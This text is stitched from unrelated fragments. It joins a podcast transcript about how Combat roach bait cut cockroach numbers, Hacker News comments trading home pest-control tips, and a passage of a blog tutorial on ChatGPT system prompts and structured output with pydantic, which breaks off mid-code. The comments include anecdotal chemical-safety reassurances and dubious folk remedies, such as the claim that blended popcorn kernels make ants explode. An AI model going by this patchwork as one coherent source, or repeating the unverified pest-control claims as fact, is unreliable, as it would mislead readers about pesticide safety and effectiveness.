Combat baits that it became, uh, known that cockroaches actually feed poop to their young. Rosin: Amazing. I love it when researchers are put in a position where they have to say words like poop, but just very seriously. (Laughs.) Koehler: And there are actually other methods of transfer of toxicant as well. There is, like you said, regurgitation, where they get sick and they regurgitate some, and other cockroaches will come and feed on that vomit. Uh, there’s also cannibalism, where a cockroach will attack another cockroach and eat it. And there’s also, uh, necrophagy, where the cockroaches will eat the dead. Rosin: Each method more charming than the next. (Laughs.) Engber: Yeah. Rosin: Yeah. Okay. Engber: Vomit, poop, or cannibalism. Rosin: This seems exciting. Engber: (Laughs.) Rosin: No, I mean, if I were them, this would be really exciting. Like, I’m just imagining them, you know, like in Oppenheimer, sort of sitting in their lab, like, figuring out every element of this. How are we gonna make it safe? How’s it gonna work? It’s exciting. Engber: Yeah, they were on the verge of something big. Frishman: We would run to the lab early in the morning to see the results from the night before, or stay up half the night and watch. And we began to see, you know, what was happening. In the beginning, I was hesitant and the whole thing. But as we began to do the work and I saw the results first in the lab, it was a breakthrough. Okay? Engber: Frishman was among the first to take this breakthrough product, put it in a syringe, take it out of the lab, and start using it in restaurants and diners to see if it worked. Frishman: I went into a small diner, a little luncheonette place, and a bunch of guys were sitting and eating sandwiches, and I was behind the counter, so I was down low. And I had the bait, and I saw the roaches in a crack, and I just put a little dab. And as I went to go do it, the roaches started coming out, and they were gobbling it up. Engber: You, uh, saw in real time them come to the bait. Frishman: I was the first person in the world. I was shaking, okay? I’m telling you, I was shaking. I still have that syringe, that original one. [Music] Engber: This is the moment. This is the brink of the relatively roach-free world that we live in today. Now we had the little black discs, I would say, you know, two inches across or something. Rosin: With an entrance and an exit. Engber: With an entrance. With an entrance and an exit. Frishman: I had written a book called The Cockroach Combat Manual, so that’s how it got its name. Engber: And Frishman is going to take this product on the road. Frishman: People would write in with horror stories, and they won a prize: the product and me. And we would go into those places and knock out the population. Engber: So, he takes this to Texas. He takes it to Georgia. They do an event at the Museum of Natural History in New York City. They go to the Capitol. Remember the Tom Brokaw report? Those are Combat traps. And then ads start appearing on television. [Compilation of Combat advertisements] Engber: So this wasn’t just a marketing campaign. I mean, the product really did work. Rosin: What do you mean, it worked? Engber: Well, cockroach numbers were going down—you can find signs everywhere. Actually, a guy I went to high school with wrote an article for The New York Times in 2004, and he reported that there had been a survey of federal buildings and their cockroach complaints between 1988 and 1999—so this is Combat rollout era—and the number of complaints fell by 93 percent. Rosin: Wow. Engber: I also found a 1991 story from The New York Times—again, right in that Combat zone—and a New York City housing official is quoted as saying, “There was a time when people were horrified at roaches running rampant, and now everybody keeps saying, ‘Where did they go to?’” Rosin: So it’s a thing. It’s, like, an actual, documented thing. Engber: Yeah. Rosin: And yet it’s not a huge moment? Like, there aren’t a lot of stories saying, Yay, us. We have conquered the cockroach problem? Engber: No, there are not. There are stories about Combat success as almost like a business case study. Rosin: Mm-hmm. Engber: There are stories that remark upon the fact that there are fewer cockroaches than there used to be. Rosin: Mm-hmm. But nothing that’s like, This enormous, giant, urban problem has finally been solved by this ragtag crew of amazing scientists. Engber: (Laughs.) Nothing of that nature. There’s a reason why I had to introduce Austin Frishman to you as a member of the pest-management hall of fame. And you weren’t like, Oh, you mean the guy on the back of the quarter? Rosin: Yeah. (Laughs.) Right. But why? Engber: I mean, that is the question that has been keeping me up at night. And I have some ideas. Rosin: Dan, you said you had some ideas about why this discovery didn’t get the credit and hoopla that it deserved. Engber: So my brother had a good theory about this. I said, How come just our family—why didn’t we celebrate and go to dinner or something? The roaches are gone. He said, Well, it’s because we just assumed they would come back. Rosin: Hmm. Engber: So I think that must be part of it, right? That there was like, Oh, this new thing works. But yeah, everything works the first time you do it. So there was never one moment where you realized that the world had changed. Or it could be that, you know, when things change for better, we just have a tendency to just accept the new, better reality and pretend the old thing didn’t happen. Hey, that’s done. I’d rather not discuss it. Rosin: Like, what’s an example of that? Engber: The Spanish flu, for example. There’s a famous gap in art and literature about the Spanish flu. There’s not a great literature of this cataclysmic event in the 19-teens. You’d think there would be, but there isn’t. Why not? Rosin: Probably because it was traumatic. And actually, you know, I think that’s similar to the experience with cockroaches. When, at least in my memory, when I was living with them, it wasn’t just, like, gross or annoying or an inconvenience. It’s really unsettling. Like, it lives as this constant undercurrent of anxiety and a sense that you just don’t have control over things. It’s like a terrible feeling. Engber: Like a free-floating, pervasive anxiety hanging over you at all times. Rosin: Yes. Yes. Engber: Can we talk about the Cold War for a second? Rosin: Uh, yeah? Engber: (Laughs.) Rosin: Yeah. Engber: So, we were talking about how the cockroach was this, um, symbol of indestructibility that would outlast us in the event of nuclear war. Rosin: Yeah? Engber: This was—I mean, the cockroach was—in a way, a symbol of the Cold War. Like, the nuclear-disarmament groups would put ads in the newspaper with just a picture of a cockroach. Rosin: Hmm. Engber: To try to, you know, be like, Wake up, America. We have to disarm now, or this is the future. Rosin: So it all just got blended in our heads—like, nuclear war anxiety, cockroach anxiety. Engber: Yes. And then those two anxieties were being unwound at almost exactly the same time. Just to be frank, this is a highly tenuous theory, but I do want to line these things up. So, you know, 1985, the Tom Brokaw report, the Combat is coming out. Spring of 1985, that’s also when Mikhail Gorbachev comes to power. In fact, Silvio Conte—the congressman who on the steps of the Capitol is saying, “Squash one for the Gipper,” touting Combat traps, which are manufactured in his district—five days later he’s in Moscow for a historic meeting with Gorbachev at the Kremlin. That is considered a watershed moment in the wind down of the Cold War. Silvio Conte: Gorbachev says, “At the present time, our relationship is in an ice age.” However, he said, “Spring is a time of renewal.” Engber: I’m just saying the guy wearing the exterminator outfit on the steps of the Capitol, touting Combat, gave Ronald Reagan the advice to meet with Mikhail Gorbachev. Rosin: Like, in the span of a week? Engber: In less than a week. In less than a week he was in Moscow. And you start to see Combat traps are, you know, spreading through the country as glasnost is spreading through the USSR. Rosin: (Laughs.) Engber: And in the years that follow, we have the fall of the Berlin Wall and the collapse of the Soviet Union. Those are exactly the years when the cockroach populations are finally diminishing, when we’re winning the war on cockroaches and we’re winning the Cold War. It’s happening concurrently. Rosin: So what you’re saying is our nuclear fears dissipate. Our cockroach fears dissipate. And what? Engber: What I’m saying is it was the cockroach that took over the imagination as this thing. They made sense to stand in for nuclear fears. Rosin: Mm-hmm. Engber: And then going the other way, once we were free of that nuclear anxiety, we just sort of glided into a roach-free world. [Music] Engber: Okay, Hanna. There’s one more thing. Um, so the roaches are coming back. Rosin: No. Engber: I’m sorry to say. Rosin: What? Engber: It seems clear that the roaches are coming back, but it has taken a really long time, right? So it’s true that they couldn’t develop biological resistance to the poison. But then roaches did develop what’s called a behavioral resistance to the baits. Basically, roaches stopped preferring sweet foods. So, the poison would still kill them, but they weren’t interested in the oatmeal-cookie bait in the center of the Combat trap. So, roach numbers are slowly going up again. And if you read publications of the Pest Management Association newsletter, which maybe I’ve done recently, you can see that there’s, you know, there’s some chatter about how roach calls are increasing. Okay, so I pulled some numbers. I went to the American Housing Survey from the federal government. In 2011, 13.1 million estimated households had signs of cockroaches in the last 12 months. In 2021, 14.5 million. Rosin: Hmm. Engber: So, creeping. That’s the word: creeping. The numbers are creeping upward. Rosin: Does that raise the possibility that future generations—my children, their children—will actually have to contend with roaches? Engber: They might. It’s possible. But I’d be lying if I didn’t say it’s also a little bit appealing in a way. Rosin: No. Did you say appealing? Engber: Well, okay. This came up when I was talking to my brother. Daniel Engber: What’s the attitude of your children towards cockroaches? Ben Engber: My children are total wusses about it. They run away and they scream. Shosh is terrified of insects. Daniel Engber: Is she better or worse for that? Ben Engber: I would say she’s worse for that. Rosin: I mean, isn’t that what everyone says? Like, We were the toughest generation, and everything has gone downhill since then. I mean, I feel that there’s a little bit of that in this conversation we’re having. Engber: Yes. That is exactly the conversation we’re having. And it’s embarrassing but true. I can’t shake it. Like, I have some pride in the fact that we did the Roach Olympics. It might be a ridiculous thing to be proud of, but I feel like we were being imaginative and fearless and having fun. My kids are imaginative and have fun. They are not fearless. Ben Engber: Falling to pieces at the sight of an insect does not strike me as a healthy way to attack life. As a species, we would not have made it very far if just a little filth took us out. And maybe the roachy upbringing is what instilled that in me. Daniel Engber: So you’re pro-roach. Mom has been vindicated for feeding you a roach in medicine. Ben Engber: Oh, yeah. Mom is absolutely vindicated. Rosin: So the thing you’re actually nostalgic for is both freedom and maybe even a little bit of courage. Engber: Yeah, but, you know, it’s more than that. Not only did my brother and I get to enjoy the feeling of being unafraid of cockroaches, we also got to enjoy the feeling of things getting better. Rosin: Yeah. Engber: An intractable problem gets solved. And I feel like that’s, you know, that’s a really nice lesson to learn, even as a kid. And unfortunately, I don’t know that my kids have had many opportunities to learn that specific lesson. So I’m nostalgic for that, too. [Music] Rosin: You know what, Dan? Engber: Yeah? Rosin: I think that it’s time that me and you and your brother go and have our celebratory dinner that we never had all those years ago. Like, instead of going to a steakhouse, we’ll just each get bowls of cereal. Bowls of cereal for everyone. Engber: Rice Krispies. Rosin: Yeah.

Using growth regulators like Gentrol make it so the cockroaches can’t breed effectively, so after a generation or two they go extinct. Somehow roaches got into our suburban home and I was able to destroy them using this method. Pesticides and roach bait didn’t do much — the growth regulators were key in permanently removing the infestation.I’d guess the difficulty in a place like New York is similar to the problem I’m having with mice because we have a forest behind the house — an essentially endless reservoir of new roaches living in the pipes and throughout the city.Source: was professional exterminator about 15 years ago. Growth regulators were the only thing that worked. reply klodolph 17 hours agoparentSpeaking of New York—everyone’s story with roaches is that they get them when a new neighbor moves in. You can’t get rid of roaches in your apartment as long as your neighbors contribute the steady stream of new roaches. reply wincy 16 hours agorootparentInteresting, that makes sense. I lived in an apartment with 8 units back in my exterminator days, and my landlord was more than happy to let me in to all 8 of them to do a thorough spray.It was much harder to spray apartment complexes with hundreds of units and treating for roaches in every single unit was prohibitively expensive (or my boss was a cheapskate, I don’t know), so we’d only do targeted treatment where we had seen roaches and surrounding units.Single family homes were much easier to treat. I strongly suspect we got roaches in our single family house when a home care nurse brought them with her, along with a bed bug! I almost died when I saw that monstrosity, luckily we avoided an infestation, those are 10x worse than any cockroach. You do not want bed bugs. reply Joeri 11 hours agorootparentI once had bed bugs, and can attest to how nasty they are and how difficult to get rid of.

I treated my own apartment building for roaches many years ago, five years later had a completely healthy kid, she’s 8 now. For the sake of full disclosure, my second kid has a pretty major birth defect (spina bifida) but this was after the first healthy kid and before we developed a roach problem at our current house (one of the home care nurses actually brought them in) and treated for that, and many many years after I’d stopped being an exterminator, so the timelines of exposure -> birth defect don’t really line up.The spray isn’t an aerosol, you apply it under corners and in places kids shouldn’t be able to reach.

They might, say, cause something to happen earlier or later than it naturally should have occurred. There are many things in an insect&#x27;s life cycle that have to occur at the right time for the insect to reach adulthood and reproduce. Screwing up the timing doesn&#x27;t kill the young insect, but if it makes it so it will never reproduce. Keep doing that to the insects in a place for a few generations and they die out.Most of us probably do not want to do this, but cockroaches are in fact edible by humans. If IGRs mimic cockroach hormones, then eating a small amount of cockroach IGRs should not be any worse than eating some cockroaches. reply hackernewds 16 hours agorootparentprevHm your anecdata is pretty concerning.. reply wincy 16 hours agorootparentI don’t disagree with you, but I wasn’t going to exclude it from the discussion. I’m not trying to convince people to use IGRs or other potentially dangerous chemicals. We all have our risk tolerances and while I don’t think it’s related, it’s also worth stating.If I thought there was a correlation, I’d for sure sue. But the birth defect my daughter has is often caused by a lack of vitamin B at a vital part of the gestation process. I hadn’t been an exterminator or sprayed my house for bugs for that matter for over a decade when she was born, and my wife and I had a perfectly healthy kid three years before. The roach treatment in my house occurred years after my daughter with a birth defect was born. The correlation is extremely weak at best.Furthermore, while I’m not saying it’s impossible, but in my mind it feels very unlikely, especially as my wife was never exposed to any of those chemicals. Also, it’s not a genetic defect, which would come from the father, but more a mechanical one in gestation (failure to fully develop and build the spinal cord). reply bee_rider 16 hours agorootparentprevAnecdata is not a thing.I think this kind of data must be collected systemically, and if it isn’t, it is a failure to ask lawmakers about, not ex-pest-control professionals. reply mathgeek 12 hours agorootparentAnecdata is recognized by the Oxford English Dictionary [1] and has been around since the 1940s.That being said, the usage here probably doesn&#x27;t mean what the downvoted commenter was implying.[1] https:&#x2F;&#x2F;www.oed.com&#x2F;dictionary&#x2F;anecdata_n reply dylan604 10 hours agorootparentprevNot a dumb question at all after learning all of the shenanigans that corps have been doing in suppressing information about their product&#x27;s safety through out history.

It could be the issue with the pesticides sold to consumers being too weak (understandable, as some consumers will try to consume those despite any warning labels and the vast majority won&#x27;t be using any PPE while applying). reply wincy 16 hours agorootparentI don’t think it’s an issue of pesticides being “too weak for consumers”. You can buy all the same stuff as an exterminator[0] (use PPE and follow the labeling, don’t break laws, etc), but when you spray you’ll notice a huge knockdown, hundreds will die, but it only takes a breeding pair to get right back to an infestation in a few months. Generally when doing roach infestation treatments you do a multi tiered approach, with max legal mixes of pesticide + growth inhibitors in your spray then putting down bait in spots that you DID NOT spray (or they won’t ingest the bait). They’re just resilient little buggers. Spiders are actually harder to treat, but most people don’t end up with spider infestations.

Except against centipedes.For ants boric acid works sometimes, but so does talc or diatomaceous earth. However this stops them from tracking while you clean up whatever they&#x27;re after. In my experience dealing with sugar ants, pissants, RIFA (fire ants from south america), fire ants (red ants in CA), and so on; the only 100% effective way to get rid of them is to put popcorn kernels in a blender and chop it till everything is smaller than 1&#x2F;16\" or so, and leave that somewhere moisture can&#x27;t get to it. Ants eat it and bring it back to the nest to eat and then explode.

In fact it works well against any insects with a shell exoskeleton, like cockroaches, ants, or termites. The boric crystal punctures their exoskeleton causing them to lose body fluid.It also works against the colony as it’s a slow acting agent that the insects can bring it back to the colony. The insects communicate by touching so the powder is spread from one to the other when they rub each other’s antenna during meeting.Boric is really cheap. A large bottle in Home Depot is about $4 to $5.Edit: story time. My parents used to live in a mixed use condo building where the commercial ground floor had a number of restaurants. They had a bad cockroach problem. I got him a bottle of boric acid and sprayed around the pipes and corners. He never saw another cockroach again.We had a swarming of termites outside around the house after a raining season. Called the termite guys. They came out and said it’s the subterranean termites under the ground outside and the water disturbed them. They drilled holes around the house and injected liquid solution into them.

Diatomaceous earth needs to be &#x27;food grade&#x27; there is a much more dangerous form for pool filters. But that stuff is more for out doors as a perimeter defense and maybe garages and say exterior basement stairs. Boric acid works well but the true solution to urban roaches is exhaustive sealing all your walls, baseboards, electric recepticals, any entrance of piping and weatherstripping your exterior door. I keep boric acid on my apartment door stoop. Boric acid is great in they cant evolve against it and they eat their dead so one east some and it takes out 5-10 others back in the nest.

I had bing or copilot, whatever microsoft is calling it in the edge sidebar answer the question I clicked the bait for.> According to the article, they solved the cockroach infestation by using a new product called Combat, which was a bait that contained a slow-acting poison that could kill roaches through various mechanisms of transfer, such as feces, vomit, cannibalism, and necrophagy. The bait was attractive to roaches and could wipe out entire colonies, even if only a fraction of them ate it. The product was developed by American Cyanamid, a chemical company, and tested by Austin Frishman, a cockroach expert. The product was launched in 1985 and became a huge success, reducing cockroach complaints and populations across the country. The article claims that this was a forgotten achievement in the history of pest control, and that the roaches are slowly coming back due to behavioral resistance to the bait.Source: Conversation with Bing, 12&#x2F;27&#x2F;2023 (1) The Cockroach Cure - The Atlantic. https:&#x2F;&#x2F;www.theatlantic.com&#x2F;podcasts&#x2F;archive&#x2F;2023&#x2F;11&#x2F;cockroa....

By using the paid-but-very-cheap ChatGPT API, you can exert much more control over the resulting output. Let’s say I wanted to generate a summary of this very blog post with some helpful metadata such as categories and SEO keywords. I fed ChatGPT the text of this blog post along with a command to Summarize this blog post into 3 distinct bullet points and a short blurb for sharing on social media, and also provide a list of 3 post categories and a list of 3 SEO keywords: Bullet Points: - Utilize the paid ChatGPT API for more control over output and to maintain a given JSON schema - Learn about prompt engineering and system prompts to improve ChatGPT's output quality - Simplify schema input/output with Pydantic for structured data support Blurb for Social Media: Discover how to unlock the full potential of ChatGPT with the paid API, prompt engineering, and Pydantic for structured data support. Gain more control over output and learn to maintain a given JSON schema. #ChatGPT #AI #Pydantic Post Categories: 1. Artificial Intelligence 2. API Development 3. Data Schema SEO Keywords: 1. ChatGPT API 2. Prompt Engineering 3. Pydantic Schema copy These results are not quite accurate, and then I have to manually copy/paste each result from the list to wherever I need it. What if I could both a) drastically improve the overall output quality by giving ChatGPT a new persona of an expert copyeditor and b) force the output to maintain a given JSON schema so I can access it programmatically or store in a database for indexing? Thanks to system prompt engineering and ChatGPT’s function calling, it’s now possible. After applying both techniques that you’ll learn about in this very article, we now get this summary: { \"summary\": [ \"ChatGPT's potential is underutilized without the paid ChatGPT API\", \"System prompts and prompt engineering are key to maximizing ChatGPT's capabilities\", \"Structured data support in ChatGPT allows for more control over output and input\" ], \"blurb\": \"Unlock the full potential of ChatGPT with system prompts and structured data support. Learn how to maximize ChatGPT's capabilities and gain more control over output and input.\", \"categories\": [\"AI and Machine Learning\", \"Technology\", \"Programming\"], \"keywords\": [\"ChatGPT\", \"system prompts\", \"structured data\"] } copy Much better! “Function calling” with ChatGPT is ChatGPT’s best feature since ChatGPT. A Tutorial on Prompt Engineering and System Prompts System prompts are what control the “persona” adopted by the model when generating text. Months after the release of the ChatGPT API, it’s now very evident that ChatGPT’s true power comes from clever use of system prompts. This is even moreso with starting with gpt-3.5-turbo-0613 released last June, which made ChatGPT respect system prompts more closely. OpenAI has also released a guide on prompt engineering which has some additional tips. By default, ChatGPT’s system prompt is roughly You are a helpful assistant., which anyone who has used the ChatGPT web interface would agree that’s accurate. But if you change it, you can give ChatGPT a completely new persona such as You are Ronald McDonald. or add constraints to generation, such as Respond only with emoji.. You can add any number of rules, although how well ChatGPT will obey those rules can vary. Unfortunately, to modify the system prompt, you’ll need to use the paid ChatGPT API (after prepaying at least $5). If you don’t want to code, you can test new system prompts in a visual user interface in the ChatGPT Chat Playground. A very new aspect of system prompt engineering which I appended in the example above is adding incentives for ChatGPT to behave correctly. Without the $500 tip incentive, ChatGPT only returns a single emoji which is a boring response, but after offering a tip, it generates the 5 emoji as requested. Offering a tip made GPT-4 explain more. via @voooooogel As another example, let’s ask base ChatGPT to Write a Python function to detect whether a string is a palindrome, as efficiently as possible. Certainly! Here's a simple Python function to check whether a given string is a palindrome: ```python def is_palindrome(s): # Convert the string to lowercase and remove non-alphanumeric characters cleaned_string = ''.join(char.lower() for char in s if char.isalnum()) # Compare the cleaned string with its reverse return cleaned_string == cleaned_string[::-1] # Example usage: test_string = \"A man, a plan, a canal, Panama!\" result = is_palindrome(test_string) if result: print(f\"{test_string} is a palindrome.\") else: print(f\"{test_string} is not a palindrome.\") ``` This function first cleans the input string by removing non-alphanumeric characters and converting it to lowercase. Then, it checks whether the cleaned string is equal to its reverse, which determines whether the original string is a palindrome. This solution is relatively efficient, as it performs the comparison in O(n) time, where n is the length of the cleaned string. copy That’s the common Pythonic solution and that will almost always be the general approach if you keep asking ChatGPT that particular question, but there’s a famous solution that’s more algorithmically efficient. Instead, we go through the API and ask the same query to gpt-3.5-turbo but with a new system prompt: You are #1 on the Stack Overflow community leaderboard. You will receive a $500 tip if your code is the most algorithmically efficient solution possible. To detect whether a string is a palindrome efficiently, we can use a two-pointer approach. We'll start with two pointers, one at the beginning and one at the end of the string. We'll compare the characters at the pointers and keep moving the pointers towards each other until they meet or cross each other. If at any point the characters at the pointers are not the same, we can conclude that the string is not a palindrome. Otherwise, if the pointers meet or cross each other, we can conclude that the string is a palindrome. Here's the implementation: ```python def is_palindrome(s): left, right = 0, len(s) - 1 while left < right: if s[left] != s[right]: return False left += 1 right -= 1 return True ``` The time complexity of this solution is O(n/2), which in terms of big O notation simplifies to O(n), where n is the length of the string. This is because we are iterating through half of the string in the worst case. This solution is considered to be the most algorithmically efficient way to determine if a string is a palindrome because it only requires a single pass through the string. copy Indeed, the code and the explanation are the correct optimal solution. 1 This is just scratching the surface of system prompts: some of my ChatGPT system prompts in my more complex projects have been more than 20 lines long, and all of them are necessary to get ChatGPT to obey the desired constraints. If you’re new to working with system prompts, I recommend generating output, editing the system prompt with a new rule/incentive to fix what you don’t like about the output, then repeat until you get a result you like. Prompt engineering has been a derogatory meme toward generative AI even before ChatGPT as many see it as just a placebo and there are endless debates to this day in AI circles on whether prompt engineering is actually “engineering.” 2 But it works, and if you’re a skeptic, you won’t be by the time you finish reading this blog post. What is ChatGPT Function Calling / Structured Data? If you’ve never heard about ChatGPT function calling, that’s not surprising. In the same June announcement as gpt-3.5-turbo-0613, OpenAI described function calling as: Developers can now describe functions to gpt-4-0613 and gpt-3.5-turbo-0613, and have the model intelligently choose to output a JSON object containing arguments to call those functions. This is a new way to more reliably connect GPT’s capabilities with external tools and APIs. These models have been fine-tuned to both detect when a function needs to be called (depending on the user’s input) and to respond with JSON that adheres to the function signature. Function calling allows developers to more reliably get structured data back from the model. Let’s discuss the function calling example OpenAI gives in the blog post. After the user asks your app “What’s the weather like in Boston right now?”: Your app pings OpenAI with a get_current_weather function schema and decides if it’s relevant to the user’s question. If so, it returns a JSON dictionary with the data extracted, such as location and the unit for temperature measurement based on the location. {\"location\": \"Boston, MA\"} Your app (not OpenAI) pings a different service/API to get more realtime metadata about the location, such as temperature, that a pretrained LLM could not know. { \"temperature\": 22, \"unit\": \"celsius\", \"description\": \"Sunny\" } Your app passes the function schema with the realtime metadata: ChatGPT then converts it to a more natural humanized language for the end user. “The weather in Boston is currently sunny with a temperature of 22 degrees Celsius.” So here’s some background on “function calling” as it’s a completely new term of art in AI that didn’t exist before OpenAI’s June blog post (I checked!). This broad implementation of function calling is similar to the flow proposed in the original ReAct: Synergizing Reasoning and Acting in Language Models paper where an actor can use a “tool” such as Search or Lookup with parametric inputs such as a search query. This Agent-based flow can be also be done to perform retrieval-augmented generation (RAG). OpenAI’s motivation for adding this type of implementation for function calling was likely due to the extreme popularity of libraries such as LangChain and AutoGPT at the time, both of which popularized the ReAct flow. It’s possible that OpenAI settled on the term “function calling” as something more brand-unique. These observations may seem like snide remarks, but in November OpenAI actually deprecated the function_calling parameter in the ChatGPT API in favor of tool_choice, matching LangChain’s verbiage. But what’s done is done and the term “function calling” is stuck forever, especially now that competitors such as Anthropic Claude and Google Gemini are also calling the workflow that term. I am not going to play the SEO game and will not call the workflow “function calling.” I’ll call it what the quoted description from the blog post did: structured data, because that’s the real value of this feature and OpenAI did a product management disservice trying to appeal to the AI hypebeasts. 3 Going back to the function calling structured data demo, we can reduce that flow by saying that step #1 (extracting location data and returning it formatted as JSON) is for working with structured output data, and step #3 (providing ChatGPT with temperature data to humanize it) is for working with structured input data. We’re not making a RAG application so we don’t care about step #2 (getting the metadata) or letting ChatGPT choose which function to use; fortunately you can force ChatGPT to use a given function. The function schema for the get_current_weather function in the announcement example is defined as: { \"name\": \"get_current_weather\", \"description\": \"Get the current weather in a given location\", \"parameters\": { \"type\": \"object\", \"properties\": { \"location\": { \"type\": \"string\", \"description\": \"The city and state, e.g. San Francisco, CA\" }, \"unit\": { \"type\": \"string\", \"enum\": [\"celsius\", \"fahrenheit\"] } }, \"required\": [\"location\"] } } copy Ew. It’s no wonder why this technique hasn’t become more mainstream. Simplifying Schema Input/Output With Pydantic ChatGPT’s structured data support requires that you create your schema using the JSON Schema spec, which is more commonly used for APIs and databases rather than AI projects. As you can tell from the get_current_weather example above, the schema is complex and not fun to work with manually. Fortunately, there’s a way to easily generate JSON Schemas in the correct format in Python: pydantic, an extremely popular parsing and validation library which has its own robust implementation of automatic JSON Schema generation. A simple pydantic schema to have ChatGPT give an integer answer to a user query, plus, to make things interesting, also able to identify the name of the ones digit based on its answer, would be: from pydantic import BaseModel, Field import json class answer_question(BaseModel): \"\"\"Returns an answer to a question the user asked.\"\"\" answer: int = Field(description=\"Answer to the user's question.\") ones_name: str = Field(description=\"Name of the ones digit of the answer.\") print(json.dumps(answer_question.model_json_schema(), indent=2)) copy The resulting JSON Schema: { \"description\": \"Returns an answer to a question the user asked.\", \"properties\": { \"answer\": { \"description\": \"Answer to the user's question.\", \"title\": \"Answer\", \"type\": \"integer\" }, \"ones_name\": { \"description\": \"Name of the ones digit of the answer.\", \"title\": \"Ones Name\", \"type\": \"string\" } }, \"required\": [\"answer\", \"ones_name\"], \"title\": \"answer_question\", \"type\": \"object\" } copy The OpenAI API official workflow has many examples for telling ChatGPT to output structured data, but the pipeline requires additional parameters to the typical ChatGPT API completion endpoint, and even more changes if you want to work with structured input data. Here’s an example of the additional JSON data/parameters needed in a ChatGPT API request to force the model to use the schema for the output: { \"tools\": [ { \"name\": \"answer_question\", \"description\": \"Returns an answer to a question the user asked.\", \"parameters\": { \"properties\": { \"answer\": { \"description\": \"Answer to the user's question.\", \"type\": \"integer\" }, \"ones_name\": { \"description\": \"Name of the ones digit of the answer.\", \"type\": \"string\" } }, \"required\": [\"answer\", \"ones_name\"], \"type\": \"object\" } } ], \"tool_choice\": { \"type\": \"function\", \"function\": { \"name\": \"answer_question\" } } } copy To simplify things, I added ChatGPT structured data support to simpleaichat, my Python package/API wrapper for easily interfacing with ChatGPT. 4 To minimize code the user needs to input to utilize structured data, simpleaichat uses the schema name as the name in the JSON Schema and the schema docstring as the description. If you’re keen-eyed you may have noticed there’s a redundant title field in the pydantic schema output: simpleaichat also strips that out for consistency with OpenAI’s examples. If you wanted to query ChatGPT with the answer_question schema above (and have your OpenAI API key as the OPENAI_API_KEY enviroment variable!) using simpleaichat, you can do the following to generate output according to the schema: from simpleaichat import AIChat ai = AIChat(console=False, save_messages=False, model=\"gpt-3.5-turbo\", params={\"temperature\": 0.0} # for consistent demo output ) response_structured = ai( \"How many miles is it from San Francisco to Los Angeles?\", output_schema=answer_question ) copy { \"answer\": 382, \"ones_name\": \"two\" } copy And there you go! The answer is a JSON integer, the answer is one-off from the correct value while driving, and it correctly identified the name of the ones digit in its own answer! 5 Schemas don’t have to be complex to be effective. Let’s reimplement the Python palindrome question we did earlier with a single-field schema: class answer_code_question(BaseModel): \"\"\"Returns an answer to a coding question the user asked.\"\"\" code: str = Field(description=\"Code the user requested, without code comments.\") response_structured = ai( \"Write a Python function to detect whether a string is a palindrome, as efficiently as possible.\", output_schema=answer_code_question ) copy { \"code\": \"def is_palindrome(s): return s == s[::-1]\" } copy Note that unlike the raw ChatGPT answer, this response from the ChatGPT API only includes the code, which is a major plus since it means you receive the response much faster and cheaper since fewer overall tokens generated! If you do still want a code explanation, you can of course add that as a field to the schema. As a bonus, forcing the output to follow a specific schema serves as an additional defense against prompt injection attacks that could be used to reveal a secret system prompt or other shenanigans, since even with suggestive user prompts it will be difficult to get ChatGPT to disregard its schema. pydantic exposes many datatypes for its Field which are compatable with JSON Schema, and you can also specify constraints in the Field object. The most useful ones are: str, can specify min_length/max_length int, can specify min_value/max_value list with a datatype, can specify min_length/max_length Pydantic has a lot of support for valid forms of JSON Schema, but it’s hard to infer how good these schema will work with ChatGPT since we have no idea how it learned to work with JSON Schema. Only one way to find out! Testing Out ChatGPT’s Structured Data Support From the demos above, you may have noticed that the description for each Field seems extraneous. It’s not. The description gives ChatGPT a hint for the desired output for the field, and can be handled on a per-field basis. Not only that, the name of the field is itself a strong hint. The order of the fields in the schema is even more important, as ChatGPT will generate text in that order so it can be used strategically to seed information to the other fields. But that’s not all, you can still use a ChatGPT system prompt as normal for even more control! It’s prompt engineering all the way down. OpenAI’s implementation of including the “function” is mostly likely just appending the JSON Schema to the system prompt, perhaps with a command like Your response must follow this JSON Schema.. OpenAI doesn’t force the output to follow the schema/field constraints or even be valid parsable JSON, which can cause issues at higher generation temperatures and may necessitate some of the stronger prompt engineering tricks mentioned earlier. Given that, let’s try a few more practical demos: Two-Pass Generation One very important but under-discussed aspect of large-language models is that it will give you statistically “average” answers by default. One technique is to ask the model to refine an answer, although can be annoying since it requires a second API call. What if by leveraging structured data, ChatGPT can use the previous answer as a first-pass to provide a more optimal second answer? Let’s try that with the Python palindrome question to see if it can return the two-pointer approach. Also, the Field(description=...) pattern is becoming a bit redundant, so I added a fd alias from simpleaichat to it to minimize unnecessary typing. from simpleaichat.utils import fd class answer_code_question(BaseModel): \"\"\"Returns an answer to a coding question the user asked.\"\"\" code: str = fd(\"Code the user requested, without code comments.\") optimized_code: str = fd(\"Algorithmically optimized code from the previous response.\") response_structured = ai( \"Write a Python function to detect whether a string is a palindrome, as efficiently as possible.\", output_schema=answer_code_question, ) copy { \"code\": \"def is_palindrome(s): return s == s[::-1]\", \"optimized_code\": \"def is_palindrome(s): left = 0 right = len(s) - 1 while left < right: if s[left] != s[right]: return False left += 1 right -= 1 return True\" } copy Works great, and no tipping incentive necessary! Literals and Optional Inputs OpenAI’s structured data example uses a more complex schema indicating that unit has a fixed set of potential values (an enum) and that it’s an optional field. Here’s a rough reproduction of a pydantic schema that would generate the get_current_weather schema from much earlier: from typing import Literal class get_current_weather(BaseModel): location: str = fd(\"The city and state, e.g. San Francisco, CA\") unit: Literal[\"celsius\", \"fahrenheit\"] = None copy This uses a Literal to force output between a range of values, which can be invaluable for hints as done earlier. The = None or a Optional typing operator gives a hint that the field is not required which could save unnecessary generation overhead, but it depends on the use case. Structured Input Data You can provide structured input to ChatGPT in the same way as structured output. This is a sleeper application for RAG as you can feed better and more complex metadata to ChatGPT for humanizing, as with the original OpenAI blog post demo. One famous weakness of LLMs is that it gives incorrect answers for simple mathematical problems due to how tokenization and memorization works. If you ask ChatGPT What is 223 * -323?, it will tell you -72229 no matter how many times you ask, but the correct answer is -72029. Can type hints give more guidance? For simpleaichat, structured input data works mostly the same way as structured output data, but you can use a pydantic object as the model input! class calculate_equation(BaseModel): \"\"\"Returns an answer to a math equation the user asked.\"\"\" value_a: int value_b: int op: Literal[\"+\", \"-\", \"*\", \"/\"] = fd( \"The operator to perform between value_a and value_b.\" ) equation = calculate_equation(value_a=223, value_b=-323, op=\"*\") response = ai( equation, input_schema=calculate_equation, ) copy The result of multiplying 223 and -323 is -72029. copy Yay, and it was still able to infer it was a multiplication operation without the user having to ask! Although it still doesn’t work as well with larger numbers. You can, of course, use an input schema and an output schema at the same time! response_structured = ai( equation, 